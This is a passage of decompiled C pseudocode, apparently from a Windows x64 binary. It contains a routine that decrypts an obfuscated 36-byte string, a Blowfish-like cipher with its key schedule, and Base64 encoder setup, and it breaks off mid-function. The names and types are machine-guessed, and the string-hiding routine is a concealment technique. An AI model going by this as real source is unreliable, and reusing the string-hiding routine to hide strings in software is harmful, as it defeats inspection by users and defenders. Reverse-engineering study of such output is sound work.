// 1400DC5CC: using guessed type char byte_1400DC5CC;
// 1400DC5CD: using guessed type char byte_1400DC5CD;
// 1400DC5CE: using guessed type char byte_1400DC5CE;
// 1400DC5CF: using guessed type char byte_1400DC5CF;
// 1400DC5D0: using guessed type char byte_1400DC5D0;
// 1400DC5D1: using guessed type char byte_1400DC5D1;
// 1400DC5D2: using guessed type char byte_1400DC5D2;
// 1400DC5D3: using guessed type char byte_1400DC5D3;
// 1400DC5D4: using guessed type char byte_1400DC5D4;
// 1400DC5D5: using guessed type char byte_1400DC5D5;
// 1400DC5D6: using guessed type char byte_1400DC5D6;
// 1400DC5D7: using guessed type char byte_1400DC5D7;
// 1400DC5D8: using guessed type char byte_1400DC5D8;
// 1400DC5D9: using guessed type char byte_1400DC5D9;
// 1400DC5DA: using guessed type char byte_1400DC5DA;
// 1400DC5DB: using guessed type char byte_1400DC5DB;
// 1400DC5DC: using guessed type char byte_1400DC5DC;
// 1400DC5DD: using guessed type char byte_1400DC5DD;
// 1400DC5DE: using guessed type char byte_1400DC5DE;
// 1400DC5DF: using guessed type char byte_1400DC5DF;

//----- (0000000140085DF0) ----------------------------------------------------
_QWORD *__fastcall sub_140085DF0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DC5E4;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DC5E4 & 1 )
  {
    v5 = byte_1400DC5E0;
  }
  else
  {
    v4 = 69069 * dword_1400DC378 + 1234567;
    v1 = dword_1400DC5E4 | 1;
    dword_1400DC378 = v4;
    dword_1400DC5E4 |= 1u;
    dword_1400DC370 = HIWORD(dword_1400DC370) + 36969 * (unsigned __int16)dword_1400DC370;
    LOBYTE(v4) = (BYTE2(dword_1400DC37C) + 80 * dword_1400DC37C) ^ v4;
    dword_1400DC37C = HIWORD(dword_1400DC37C) + 18000 * (unsigned __int16)dword_1400DC37C;
    v5 = (((unsigned int)dword_1400DC374 >> 13) ^ 32 * dword_1400DC374 ^ dword_1400DC374) + v4;
    dword_1400DC374 ^= ((unsigned int)dword_1400DC374 >> 13) ^ 32 * (dword_1400DC374 ^ (dword_1400DC374 << 12));
    byte_1400DC5E0 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DC5E4 = v1 | 2;
    byte_1400DC5E8[0] = v5 ^ 0xCE;
    byte_1400DC5E9 = (v5 - 1) ^ 0x1C;
    byte_1400DC5EA = (v5 - 2) ^ 0x6A;
    byte_1400DC5EB = (v5 - 3) ^ 0xD4;
    byte_1400DC5EC = (v5 - 4) ^ 0xBD;
    byte_1400DC5ED = (v5 - 5) ^ 0xCB;
    byte_1400DC5EE = (v5 - 6) ^ 0x46;
    byte_1400DC5EF = (v5 - 7) ^ 0x4E;
    byte_1400DC5F0 = (v5 - 8) ^ 0x65;
    byte_1400DC5F1 = (v5 - 9) ^ 0x36;
    byte_1400DC5F2 = (v5 - 10) ^ 8;
    byte_1400DC5F3 = (v5 - 11) ^ 0xEE;
    byte_1400DC5F4 = (v5 - 12) ^ 0x8F;
    byte_1400DC5F5 = (v5 - 13) ^ 0x1D;
    byte_1400DC5F6 = (v5 - 14) ^ 0xCC;
    byte_1400DC5F7 = (v5 - 15) ^ 0x76;
    byte_1400DC5F8 = (v5 - 16) ^ 0x42;
    byte_1400DC5F9 = (v5 - 17) ^ 0xD8;
    byte_1400DC5FA = (v5 - 18) ^ 0xFA;
    byte_1400DC5FB = (v5 - 19) ^ 0xC1;
    byte_1400DC5FC = (v5 - 20) ^ 4;
    byte_1400DC5FD = (v5 - 21) ^ 0x5F;
    byte_1400DC5FE = (v5 - 22) ^ 0x11;
    byte_1400DC5FF = (v5 - 23) ^ 0x40;
    byte_1400DC600 = (v5 - 24) ^ 0x23;
    byte_1400DC601 = (v5 - 25) ^ 0x72;
    byte_1400DC602 = (v5 - 26) ^ 0x7A;
    byte_1400DC603 = (v5 - 27) ^ 0xBF;
    byte_1400DC604 = (v5 - 28) ^ 0xF2;
    byte_1400DC605 = (v5 - 29) ^ 0x45;
    byte_1400DC606 = (v5 - 30) ^ 0x95;
    byte_1400DC607 = (v5 - 31) ^ 0x26;
    byte_1400DC608 = (v5 - 32) ^ 5;
    byte_1400DC609 = (v5 - 33) ^ 2;
    byte_1400DC60A = (v5 - 34) ^ 1;
    byte_1400DC60B = (v5 - 35) ^ 0x11;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x24ui64 )
  {
    sub_140004790(Src, 0x24ui64, 0i64);
    v5 = byte_1400DC5E0;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v6[1] = 0i64;
  v6[2] = 0i64;
  v6[3] = 0i64;
  *((_DWORD *)v6 + 8) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 36i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 36) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DC5E8[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x24 );
  return v3;
}
// 1400DC370: using guessed type int dword_1400DC370;
// 1400DC374: using guessed type int dword_1400DC374;
// 1400DC378: using guessed type int dword_1400DC378;
// 1400DC37C: using guessed type int dword_1400DC37C;
// 1400DC5E0: using guessed type char byte_1400DC5E0;
// 1400DC5E4: using guessed type int dword_1400DC5E4;
// 1400DC5E9: using guessed type char byte_1400DC5E9;
// 1400DC5EA: using guessed type char byte_1400DC5EA;
// 1400DC5EB: using guessed type char byte_1400DC5EB;
// 1400DC5EC: using guessed type char byte_1400DC5EC;
// 1400DC5ED: using guessed type char byte_1400DC5ED;
// 1400DC5EE: using guessed type char byte_1400DC5EE;
// 1400DC5EF: using guessed type char byte_1400DC5EF;
// 1400DC5F0: using guessed type char byte_1400DC5F0;
// 1400DC5F1: using guessed type char byte_1400DC5F1;
// 1400DC5F2: using guessed type char byte_1400DC5F2;
// 1400DC5F3: using guessed type char byte_1400DC5F3;
// 1400DC5F4: using guessed type char byte_1400DC5F4;
// 1400DC5F5: using guessed type char byte_1400DC5F5;
// 1400DC5F6: using guessed type char byte_1400DC5F6;
// 1400DC5F7: using guessed type char byte_1400DC5F7;
// 1400DC5F8: using guessed type char byte_1400DC5F8;
// 1400DC5F9: using guessed type char byte_1400DC5F9;
// 1400DC5FA: using guessed type char byte_1400DC5FA;
// 1400DC5FB: using guessed type char byte_1400DC5FB;
// 1400DC5FC: using guessed type char byte_1400DC5FC;
// 1400DC5FD: using guessed type char byte_1400DC5FD;
// 1400DC5FE: using guessed type char byte_1400DC5FE;
// 1400DC5FF: using guessed type char byte_1400DC5FF;
// 1400DC600: using guessed type char byte_1400DC600;
// 1400DC601: using guessed type char byte_1400DC601;
// 1400DC602: using guessed type char byte_1400DC602;
// 1400DC603: using guessed type char byte_1400DC603;
// 1400DC604: using guessed type char byte_1400DC604;
// 1400DC605: using guessed type char byte_1400DC605;
// 1400DC606: using guessed type char byte_1400DC606;
// 1400DC607: using guessed type char byte_1400DC607;
// 1400DC608: using guessed type char byte_1400DC608;
// 1400DC609: using guessed type char byte_1400DC609;
// 1400DC60A: using guessed type char byte_1400DC60A;
// 1400DC60B: using guessed type char byte_1400DC60B;

//----- (0000000140086E4C) ----------------------------------------------------
void sub_140086E4C()
{
  void (**i)(void); // rbx

  for ( i = (void (**)(void))&unk_1400B6FB8; i < (void (**)(void))&unk_1400B6FB8; ++i )
  {
    if ( *i )
      (*i)();
  }
}

//----- (0000000140086E84) ----------------------------------------------------
void __cdecl sub_140086E84()
{
  void (**i)(void); // rbx

  for ( i = (void (**)(void))&unk_1400B6FC8; i < (void (**)(void))&unk_1400B6FC8; ++i )
  {
    if ( *i )
      (*i)();
  }
}

//----- (0000000140086F50) ----------------------------------------------------
__int64 __fastcall sub_140086F50(__int64 a1, unsigned int *a2, _DWORD *a3, unsigned __int32 *a4)
{
  _DWORD *v4; // rsi
  unsigned __int32 v5; // er11
  __int64 v6; // rbx
  _DWORD *v7; // r10
  signed __int64 v8; // rdi
  unsigned __int32 v9; // eax
  signed __int64 v10; // rbp
  int v11; // edx
  int v12; // er8
  int *v13; // r10
  __int64 result; // rax

  v4 = *(_DWORD **)(a1 + 104);
  v5 = _byteswap_ulong(a2[1]);
  v6 = *(_QWORD *)(a1 + 4224);
  v7 = a3;
  v8 = (signed __int64)(v4 + 2);
  v9 = *v4 ^ _byteswap_ulong(*a2);
  v10 = 8i64;
  do
  {
    v8 += 8i64;
    v5 ^= *(_DWORD *)(v8 - 12) ^ (*(_DWORD *)(v6 + 4i64 * ((unsigned int)(unsigned __int8)v9 + 768))
                                + (*(_DWORD *)(v6 + 4i64 * ((unsigned int)BYTE1(v9) + 512)) ^ (*(_DWORD *)(v6 + 4i64 * HIBYTE(v9))
                                                                                             + *(_DWORD *)(v6 + 4i64 * ((unsigned int)BYTE2(v9) + 256)))));
    v9 ^= *(_DWORD *)(v8 - 8) ^ (*(_DWORD *)(v6 + 4i64 * ((unsigned int)(unsigned __int8)v5 + 768))
                               + (*(_DWORD *)(v6 + 4i64 * ((unsigned int)BYTE1(v5) + 512)) ^ (*(_DWORD *)(v6 + 4i64 * HIBYTE(v5))
                                                                                            + *(_DWORD *)(v6 + 4i64 * ((unsigned int)BYTE2(v5) + 256)))));
    --v10;
  }
  while ( v10 );
  v11 = 0;
  if ( a3 )
    v12 = *a3;
  else
    v12 = 0;
  *a4 = v12 ^ _byteswap_ulong(v5 ^ v4[17]);
  if ( v7 )
  {
    v13 = v7 + 1;
    if ( v13 )
      v11 = *v13;
  }
  result = v11 ^ _byteswap_ulong(v9);
  a4[1] = result;
  return result;
}

//----- (0000000140087080) ----------------------------------------------------
__int64 __fastcall sub_140087080(__int64 a1, __int64 a2, unsigned int a3)
{
  __int64 v3; // rax
  __int64 v4; // rsi
  __int64 v5; // r11
  __int64 v6; // rdi
  unsigned int v7; // er10
  signed __int64 v8; // rdx
  __int64 v9; // rcx
  __int128 *v10; // rax
  __int128 v11; // xmm0
  __int64 v12; // rbx
  signed __int64 v13; // rbp
  unsigned int v14; // er9
  int v15; // er8
  unsigned int v16; // eax
  signed __int64 v17; // rcx
  signed __int64 v18; // rbp
  signed __int64 v19; // rbx
  signed __int64 v20; // rbp
  __int64 result; // rax
  int *v22; // rdx
  int v23; // ecx
  __int64 v24; // rdx
  int v25; // ecx
  __int64 v26; // rdx
  int v27; // ecx
  __int64 v28; // rdx
  int v29; // ecx
  __int64 v30; // rdx
  int v31; // ecx
  __int64 v32; // rdx
  int v33; // ecx
  __int64 v34; // rdx
  int v35; // ecx
  __int64 v36; // rdx
  int v37; // ecx
  __int64 v38; // rdx
  int v39; // ecx
  __int64 v40; // [rsp+30h] [rbp+8h]

  v3 = *(_QWORD *)(a1 + 112);
  v4 = 0i64;
  v5 = a2;
  v6 = a1;
  v7 = a3;
  *(_OWORD *)v3 = xmmword_1400B14A0;
  v40 = 0i64;
  v8 = 32i64;
  *(_OWORD *)(v3 + 16) = xmmword_1400B14B0;
  *(_OWORD *)(v3 + 32) = xmmword_1400B14C0;
  *(_OWORD *)(v3 + 48) = xmmword_1400B14D0;
  *(_QWORD *)(v3 + 64) = -8540519122497776167i64;
  v9 = *(_QWORD *)(a1 + 4232);
  v10 = (__int128 *)&unk_1400B14F0;
  do
  {
    v11 = *v10;
    v9 += 128i64;
    v10 += 8;
    *(_OWORD *)(v9 - 128) = v11;
    *(_OWORD *)(v9 - 112) = *(v10 - 7);
    *(_OWORD *)(v9 - 96) = *(v10 - 6);
    *(_OWORD *)(v9 - 80) = *(v10 - 5);
    *(_OWORD *)(v9 - 64) = *(v10 - 4);
    *(_OWORD *)(v9 - 48) = *(v10 - 3);
    *(_OWORD *)(v9 - 32) = *(v10 - 2);
    *(_OWORD *)(v9 - 16) = *(v10 - 1);
    --v8;
  }
  while ( v8 );
  v12 = 0i64;
  v13 = 18i64;
  v14 = 2;
  do
  {
    v12 += 4i64;
    v15 = *(unsigned __int8 *)(v14 % v7 + v5) | ((*(unsigned __int8 *)((v14 - 1) % v7 + v5) | (*(unsigned __int8 *)((v14 - 2) % v7 + v5) << 8)) << 8);
    v16 = v14 + 1;
    v14 += 4;
    *(_DWORD *)(v12 + *(_QWORD *)(v6 + 112) - 4) ^= *(unsigned __int8 *)(v16 % v7 + v5) | (v15 << 8);
    --v13;
  }
  while ( v13 );
  sub_1400872F0(v6, &v40, *(int **)(v6 + 112));
  v17 = 0i64;
  v18 = 8i64;
  do
  {
    v19 = v17 + 8;
    sub_1400872F0(v6, (_DWORD *)(*(_QWORD *)(v6 + 112) + v17), (int *)(*(_QWORD *)(v6 + 112) + v17 + 8));
    v17 = v19;
    --v18;
  }
  while ( v18 );
  sub_1400872F0(v6, (_DWORD *)(*(_QWORD *)(v6 + 112) + 64i64), *(int **)(v6 + 4232));
  v20 = 511i64;
  do
  {
    sub_1400872F0(v6, (_DWORD *)(*(_QWORD *)(v6 + 4232) + v4), (int *)(*(_QWORD *)(v6 + 4232) + v4 + 8));
    v4 += 8i64;
    --v20;
  }
  while ( v20 );
  result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(v6 + 8) + 56i64))(v6 + 8);
  if ( !(_BYTE)result )
  {
    v22 = *(int **)(v6 + 112);
    v23 = *v22;
    *v22 = v22[17];
    v22[17] = v23;
    v24 = *(_QWORD *)(v6 + 112);
    v25 = *(_DWORD *)(v24 + 4);
    *(_DWORD *)(v24 + 4) = *(_DWORD *)(v24 + 64);
    *(_DWORD *)(v24 + 64) = v25;
    v26 = *(_QWORD *)(v6 + 112);
    v27 = *(_DWORD *)(v26 + 8);
    *(_DWORD *)(v26 + 8) = *(_DWORD *)(v26 + 60);
    *(_DWORD *)(v26 + 60) = v27;
    v28 = *(_QWORD *)(v6 + 112);
    v29 = *(_DWORD *)(v28 + 12);
    *(_DWORD *)(v28 + 12) = *(_DWORD *)(v28 + 56);
    *(_DWORD *)(v28 + 56) = v29;
    v30 = *(_QWORD *)(v6 + 112);
    v31 = *(_DWORD *)(v30 + 16);
    *(_DWORD *)(v30 + 16) = *(_DWORD *)(v30 + 52);
    *(_DWORD *)(v30 + 52) = v31;
    v32 = *(_QWORD *)(v6 + 112);
    v33 = *(_DWORD *)(v32 + 20);
    *(_DWORD *)(v32 + 20) = *(_DWORD *)(v32 + 48);
    *(_DWORD *)(v32 + 48) = v33;
    v34 = *(_QWORD *)(v6 + 112);
    v35 = *(_DWORD *)(v34 + 24);
    *(_DWORD *)(v34 + 24) = *(_DWORD *)(v34 + 44);
    *(_DWORD *)(v34 + 44) = v35;
    v36 = *(_QWORD *)(v6 + 112);
    v37 = *(_DWORD *)(v36 + 28);
    *(_DWORD *)(v36 + 28) = *(_DWORD *)(v36 + 40);
    *(_DWORD *)(v36 + 40) = v37;
    v38 = *(_QWORD *)(v6 + 112);
    result = *(unsigned int *)(v38 + 36);
    v39 = *(_DWORD *)(v38 + 32);
    *(_DWORD *)(v38 + 32) = result;
    *(_DWORD *)(v38 + 36) = v39;
  }
  return result;
}
// 1400B14A0: using guessed type __int128 xmmword_1400B14A0;
// 1400B14B0: using guessed type __int128 xmmword_1400B14B0;
// 1400B14C0: using guessed type __int128 xmmword_1400B14C0;
// 1400B14D0: using guessed type __int128 xmmword_1400B14D0;

//----- (00000001400872F0) ----------------------------------------------------
__int64 __fastcall sub_1400872F0(__int64 a1, _DWORD *a2, int *a3)
{
  _DWORD *v3; // rbx
  int v4; // er10
  __int64 v5; // r11
  signed __int64 v6; // rdi
  __int64 result; // rax
  signed __int64 v8; // rbp
  int v9; // ecx

  v3 = *(_DWORD **)(a1 + 112);
  v4 = a2[1];
  v5 = *(_QWORD *)(a1 + 4232);
  v6 = (signed __int64)(v3 + 2);
  LODWORD(result) = *a2 ^ *v3;
  v8 = 8i64;
  do
  {
    v6 += 8i64;
    v4 ^= *(_DWORD *)(v6 - 12) ^ (*(_DWORD *)(v5 + 4i64 * ((unsigned int)(unsigned __int8)result + 768))
                                + (*(_DWORD *)(v5 + 4i64 * ((unsigned int)BYTE1(result) + 512)) ^ (*(_DWORD *)(v5 + 4i64 * BYTE3(result))
                                                                                                 + *(_DWORD *)(v5 + 4i64 * ((unsigned int)BYTE2(result) + 256)))));
    result = *(_DWORD *)(v6 - 8) ^ (*(_DWORD *)(v5 + 4i64 * ((unsigned int)(unsigned __int8)v4 + 768))
                                  + (*(_DWORD *)(v5 + 4i64 * ((unsigned int)BYTE1(v4) + 512)) ^ (*(_DWORD *)(v5 + 4i64 * HIBYTE(v4))
                                                                                               + *(_DWORD *)(v5 + 4i64 * ((unsigned int)BYTE2(v4) + 256))))) ^ (unsigned int)result;
    --v8;
  }
  while ( v8 );
  v9 = v4 ^ v3[17];
  a3[1] = result;
  *a3 = v9;
  return result;
}

//----- (00000001400873F0) ----------------------------------------------------
__int64 __fastcall sub_1400873F0(__int64 a1, void *a2, __int64 a3, _BYTE *a4)
{
  _BYTE *v4; // rbx
  __int64 v5; // rdi
  void *v6; // rbp
  __int64 v7; // rsi
  __int64 result; // rax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  if ( !qword_1400DAB40
    || !(unsigned __int8)type_info::operator==(&unsigned char `RTTI Type Descriptor', &int `RTTI Type Descriptor')
    || (result = qword_1400DAB40(v5, v4, v7 + 32), !(_BYTE)result) )
  {
    sub_1400293A0(v6, (__int64)&unsigned char `RTTI Type Descriptor', v5);
    result = *(unsigned __int8 *)(v7 + 32);
    *v4 = result;
  }
  return result;
}
// 1400A1928: using guessed type __int64 __fastcall type_info::operator==(_QWORD, _QWORD);
// 1400D8D00: using guessed type int int `RTTI Type Descriptor';
// 1400D9538: using guessed type unsigned __int8 unsigned char `RTTI Type Descriptor';
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (0000000140087480) ----------------------------------------------------
void *sub_140087480()
{
  if ( !byte_1400DCC0C )
  {
    sub_140066E60(&unk_1400DCC10, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", 0x40u, 0);
    byte_1400DCC0C = 1;
  }
  return &unk_1400DCC10;
}
// 1400DCC0C: using guessed type char byte_1400DCC0C;

//----- (00000001400874D0) ----------------------------------------------------
void __fastcall sub_1400874D0(__int64 a1, __int64 a2)
{
  __int64 v2; // r13
  __int64 v3; // rbx
  char v4; // di
  char v5; // al
  signed int v6; // ecx
  const char *v7; // rdx
  signed int v8; // er12
  __int64 v9; // r15
  signed __int64 v10; // rax
  signed __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rbx
  char v14; // si
  char *v15; // rax
  const char *v16; // rdi
  __int64 v17; // r14
  void (__fastcall ***v18)(_QWORD, signed __int64); // rcx
  void (__fastcall ***v19)(_QWORD, signed __int64); // rcx
  char *v20; // rdi
  __int64 v21; // r14
  void (__fastcall ***v22)(_QWORD, signed __int64); // rcx
  void (__fastcall ***v23)(_QWORD, signed __int64); // rcx
  __int64 v24; // rax
  __int64 v25; // rbx
  char *v26; // rax
  const char *v27; // rdi
  __int64 v28; // rsi
  void (__fastcall ***v29)(_QWORD, signed __int64); // rcx
  void (__fastcall ***v30)(_QWORD, signed __int64); // rcx
  char v31; // [rsp+20h] [rbp-89h]
  const char *v32; // [rsp+28h] [rbp-81h]
  __int64 (__fastcall **v33)(); // [rsp+30h] [rbp-79h]
  __int64 v34; // [rsp+38h] [rbp-71h]
  __int64 v35; // [rsp+40h] [rbp-69h]
  char v36; // [rsp+48h] [rbp-61h]
  const char *v37; // [rsp+50h] [rbp-59h]
  __int64 v38; // [rsp+58h] [rbp-51h]
  unsigned __int64 v39; // [rsp+68h] [rbp-41h]
  void *Memory; // [rsp+70h] [rbp-39h]
  char v41; // [rsp+78h] [rbp-31h]
  const char *v42; // [rsp+80h] [rbp-29h]
  __int64 v43; // [rsp+88h] [rbp-21h]
  unsigned __int64 v44; // [rsp+98h] [rbp-11h]
  void *v45; // [rsp+A0h] [rbp-9h]
  __int64 v46; // [rsp+A8h] [rbp-1h]
  char v47; // [rsp+B0h] [rbp+7h]
  void (__fastcall ***v48)(_QWORD, signed __int64); // [rsp+B8h] [rbp+Fh]

  v46 = -2i64;
  v2 = a2;
  v3 = a1;
  v4 = 1;
  if ( (*(unsigned __int8 (__fastcall **)(__int64, const char *, bool *, char *))(*(_QWORD *)a2 + 8i64))(
         a2,
         "InsertLineBreaks",
         &bool `RTTI Type Descriptor',
         &v31) )
  {
    v4 = v31;
  }
  v5 = (*(__int64 (__fastcall **)(__int64, const char *, int *, const char **))(*(_QWORD *)v2 + 8i64))(
         v2,
         "MaxLineLength",
         &int `RTTI Type Descriptor',
         &v32);
  v6 = 72;
  if ( v5 )
    v6 = (signed int)v32;
  v7 = byte_1400A3400;
  if ( v4 )
    v7 = "\n";
  v8 = 0;
  if ( v4 )
    v8 = v6;
  v32 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  v9 = *(_QWORD *)(v3 + 136);
  v44 = 0i64;
  v45 = 0i64;
  if ( v7 )
  {
    v10 = -1i64;
    do
      ++v10;
    while ( v7[v10] );
  }
  else
  {
    v10 = 0i64;
  }
  v42 = v7;
  v43 = v10;
  v41 = 0;
  v39 = 0i64;
  Memory = 0i64;
  if ( v7 )
  {
    v11 = -1i64;
    do
      ++v11;
    while ( v7[v11] );
  }
  else
  {
    v11 = 0i64;
  }
  v37 = v7;
  v38 = v11;
  v36 = 0;
  v12 = sub_140067C00((__int64)&v47, (__int64)"EncodingLookupArray", &v32, 0);
  v13 = v12;
  v14 = *(_BYTE *)(v12 + 16);
  v15 = (char *)operator new(0x28ui64);
  v16 = v15;
  if ( v15 )
  {
    *((_QWORD *)v15 + 1) = "PaddingByte";
    v15[16] = v14;
    v15[17] = 0;
    *((_QWORD *)v15 + 3) = 0i64;
    *(_QWORD *)v15 = &off_1400B1488;
    v15[32] = 61;
  }
  else
  {
    v16 = 0i64;
  }
  v32 = v16;
  v17 = *(_QWORD *)(v13 + 8);
  *(_QWORD *)(v13 + 8) = 0i64;
  v18 = (void (__fastcall ***)(_QWORD, signed __int64))*((_QWORD *)v16 + 3);
  if ( v18 )
    (**v18)(v18, 1i64);
  *((_QWORD *)v16 + 3) = v17;
  v32 = 0i64;
  v19 = *(void (__fastcall ****)(_QWORD, signed __int64))(v13 + 8);
  if ( v19 )
    (**v19)(v19, 1i64);
  *(_QWORD *)(v13 + 8) = v16;
  *(_BYTE *)(v13 + 16) = v14;
  v20 = (char *)operator new(0x28ui64);
  if ( v20 )
  {
    *((_QWORD *)v20 + 1) = "GroupSize";
    v20[16] = v14;
    v20[17] = 0;
    *((_QWORD *)v20 + 3) = 0i64;
    *(_QWORD *)v20 = &off_1400A6710;
    *((_DWORD *)v20 + 8) = v8;
  }
  else
  {
    v20 = 0i64;
  }
  v32 = v20;
  v21 = *(_QWORD *)(v13 + 8);
  *(_QWORD *)(v13 + 8) = 0i64;
  v22 = (void (__fastcall ***)(_QWORD, signed __int64))*((_QWORD *)v20 + 3);
  if ( v22 )
    (**v22)(v22, 1i64);
  *((_QWORD *)v20 + 3) = v21;
  v32 = 0i64;
  v23 = *(void (__fastcall ****)(_QWORD, signed __int64))(v13 + 8);
  if ( v23 )
    (**v23)(v23, 1i64);
  *(_QWORD *)(v13 + 8) = v20;
  *(_BYTE *)(v13 + 16) = v14;
  v24 = sub_140036B50(v13, (__int64)"Separator", (__int64)&v36, v14);
  v25 = sub_140036B50(v24, (__int64)"Terminator", (__int64)&v41, *(_BYTE *)(v24 + 16));
  v26 = (char *)operator new(0x28ui64);
  v27 = v26;
  if ( v26 )
  {
    *((_QWORD *)v26 + 1) = "Log2Base";
    *((_WORD *)v26 + 8) = 1;
    *((_QWORD *)v26 + 3) = 0i64;
    *(_QWORD *)v26 = &off_1400A6710;
    *((_DWORD *)v26 + 8) = 6;
  }
  else
  {
    v27 = 0i64;
  }
  v32 = v27;
  v28 = *(_QWORD *)(v25 + 8);
  *(_QWORD *)(v25 + 8) = 0i64;
  v29 = (void (__fastcall ***)(_QWORD, signed __int64))*((_QWORD *)v27 + 3);
  if ( v29 )
    (**v29)(v29, 1i64);
  *((_QWORD *)v27 + 3) = v28;
  v32 = 0i64;
  v30 = *(void (__fastcall ****)(_QWORD, signed __int64))(v25 + 8);
  if ( v30 )
    (**v30)(v30, 1i64);
  *(_QWORD *)(v25 + 8) = v27;
  *(_BYTE *)(v25 + 16) = 1;
  v33 = &off_1400AB728;
  v34 = v2;
  v35 = v25;
  (*(void (__fastcall **)(__int64, __int64 (__fastcall ***)(), signed __int64))(*(_QWORD *)v9 + 80i64))(
    v9,
    &v33,
    0xFFFFFFFFi64);
  if ( v48 )
    (**v48)(v48, 1i64);
  memset(Memory, 0, v39);
  free(Memory);
  memset(v45, 0, v44);
  free(v45);
}
// 1400A6710: using guessed type __int64 (__fastcall *off_1400A6710)(void *);
// 1400AB728: using guessed type __int64 (__fastcall *off_1400AB728)();
// 1400B1488: using guessed type __int64 (__fastcall *off_1400B1488)(void *);
// 1400D8D00: using guessed type int int `RTTI Type Descriptor';
// 1400D9230: using guessed type bool bool `RTTI Type Descriptor';

//----- (0000000140087850) ----------------------------------------------------
__int64 __fastcall sub_140087850(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi
  __int64 result; // rax

  v2 = a2;
  v3 = a1;
  if ( a2 )
  {
    sub_140023920(a2, a1);
    *(_QWORD *)v2 = &off_1400B1488;
    result = *(unsigned __int8 *)(v3 + 32);
    *(_BYTE *)(v2 + 32) = result;
  }
  return result;
}
// 1400B1488: using guessed type __int64 (__fastcall *off_1400B1488)(void *);

//----- (00000001400878A0) ----------------------------------------------------
__int64 __fastcall sub_1400878A0(__int64 a1)
{
  __int64 v1; // rbx
  signed __int64 v2; // rcx

  v1 = a1;
  sub_140036DA0(a1 + 8, 1);
  *(_BYTE *)(v1 + 553) = 0;
  *(_QWORD *)(v1 + 560) = 132i64;
  if ( *(_BYTE *)(v1 + 553) )
  {
    v2 = 0i64;
  }
  else
  {
    *(_BYTE *)(v1 + 553) = 1;
    v2 = v1 + 24;
  }
  *(_QWORD *)(v1 + 568) = v2;
  *(_QWORD *)v1 = &off_1400B3260;
  *(_QWORD *)(v1 + 8) = off_1400B32D8;
  return v1;
}
// 1400B3260: using guessed type __int64 (__fastcall *off_1400B3260)(void *);
// 1400B32D8: using guessed type __int64 (__fastcall *off_1400B32D8[2])();

//----- (0000000140087910) ----------------------------------------------------
_QWORD *__fastcall sub_140087910(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  _WORD *v4; // rax

  v2 = a2;
  v3 = (_QWORD *)a1;
  if ( a2 )
    v4 = (_WORD *)(a2 + 16);
  else
    v4 = 0i64;
  *(_WORD *)(a1 + 16) = *v4;
  sub_140088020(a1 + 24, a2 + 24);
  sub_14007AB70((__int64)(v3 + 26), v2 + 208);
  *v3 = &off_1400B30A0;
  v3[1] = off_1400B3118;
  return v3;
}
// 1400B30A0: using guessed type __int64 (__fastcall *off_1400B30A0)(void *);
// 1400B3118: using guessed type __int64 (__fastcall *off_1400B3118[2])();

//----- (0000000140087F30) ----------------------------------------------------
_QWORD *__fastcall sub_140087F30(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rbx
  _QWORD *v3; // rdi
  signed __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  sub_140088110(a1);
  *v3 = &off_1400B35E0;
  v3[1] = &off_1400B3688;
  v3[2] = &off_1400B36C0;
  v4 = (signed __int64)v3 + *(signed int *)(v3[5] + 4i64) + 40;
  (*(void (__fastcall **)(signed __int64, __int64))(*(_QWORD *)v4 + 16i64))(v4, v2);
  return v3;
}
// 1400B35E0: using guessed type __int64 (__fastcall *off_1400B35E0)(void *);
// 1400B3688: using guessed type __int64 (__fastcall *off_1400B3688)();
// 1400B36C0: using guessed type __int64 (__fastcall *off_1400B36C0)();

//----- (0000000140087FA0) ----------------------------------------------------
__int64 __fastcall sub_140087FA0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi
  __int64 v4; // rsi
  void *v5; // rax
  const void *v6; // r8

  v2 = a1;
  v3 = a2;
  *(_QWORD *)(a1 + 8) = *(_QWORD *)(a2 + 8);
  v4 = *(_QWORD *)(a2 + 8);
  sub_14004F230(*(_QWORD *)(a2 + 8));
  if ( v4 )
    v5 = sub_14003A000(4 * v4);
  else
    v5 = 0i64;
  *(_QWORD *)(v2 + 16) = v5;
  v6 = *(const void **)(v3 + 16);
  if ( v6 )
    memcpy_s(v5, 4i64 * *(_QWORD *)(v2 + 8), v6, 4i64 * *(_QWORD *)(v3 + 8));
  return v2;
}

//----- (0000000140088020) ----------------------------------------------------
__int64 __fastcall sub_140088020(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  __int64 v3; // rbx
  const void *v4; // r8

  *(_BYTE *)(a1 + 161) = 0;
  v2 = *(_QWORD *)(a2 + 168);
  v3 = a1;
  *(_QWORD *)(a1 + 168) = v2;
